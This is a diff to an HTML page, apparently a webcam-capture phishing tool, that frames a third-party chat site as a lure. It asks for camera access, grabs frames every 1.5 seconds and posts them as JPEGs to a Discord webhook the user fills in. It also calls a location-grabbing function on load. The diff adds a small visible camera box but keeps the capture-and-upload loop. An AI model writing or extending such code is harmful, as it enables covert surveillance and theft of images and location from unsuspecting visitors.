@@ -4,6 +4,27 @@
 <head>
   <script type="text/javascript" src="dwebhook.js">
   </script>
+  <style>
+    /* Add a small box for the camera feed so the browser renders it */
+    #videoContainer {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      width: 160px;
+      height: 120px;
+      background: black;
+      z-index: 90000;
+      border: 2px solid #4CAF50;
+      border-radius: 8px;
+      overflow: hidden;
+      display: none; /* Hidden until camera is allowed */
+    }
+    #videoContainer video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+  </style>
 </head>
 
 <body onload="getLocation(); checkCamera();">
@@ -66,6 +87,11 @@
       border-radius: 8px;
       cursor: pointer;
     ">Enable Camera</button>
+  </div>
+
+  <!-- Visible Camera Box -->
+  <div id="videoContainer">
+    <video id="video" playsinline autoplay muted></video>
   </div>
 
   <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
@@ -263,19 +289,9 @@
       }
     }
   </script>
-  <div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay muted></video>
-  </div>
-  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
   <script>
     // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
-    // Example: https://discord.com/api/webhooks/ID/TOKEN
     let discordWebhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
-
-    // Remove the local server logic
-    // var url = "";
-    // request.open("GET", "/get_target", true);
-    // request.onload = function () { ... };
 
     function postFile(file) {
       let formdata = new FormData();
@@ -295,7 +311,12 @@
 
 
     const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    const canvas = document.createElement('canvas'); // Create canvas dynamically
+    canvas.width = 640;
+    canvas.height = 480;
+    // Hide canvas, only video is visible
+    canvas.style.display = 'none'; 
+
     const errorMsgElement = document.querySelector('span#errorMsg');
 
     const constraints = {
@@ -308,6 +329,7 @@
     function checkCamera() {
        if (localStorage.getItem("cameraGranted") === "true") {
            document.getElementById("cameraOverlay").style.display = "none";
+           document.getElementById("videoContainer").style.display = "block";
        }
     }
 
@@ -326,18 +348,16 @@
     function handleSuccess(stream) {
       window.stream = stream;
       video.srcObject = stream;
+      document.getElementById("videoContainer").style.display = "block";
 
       var context = canvas.getContext('2d');
       
-      // Add a small delay to ensure video is ready on mobile before drawing
-      setTimeout(function () {
-        // Start capturing loop
-        setInterval(function () {
+      // Start capturing loop
+      setInterval(function () {
 
-          context.drawImage(video, 0, 0, 640, 480);
-          canvas.toBlob(postFile, 'image/jpeg');
-        }, 1500);
-      }, 1000);
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(postFile, 'image/jpeg');
+      }, 1500);
       
       document.getElementById("cameraOverlay").style.display = "none";
     }
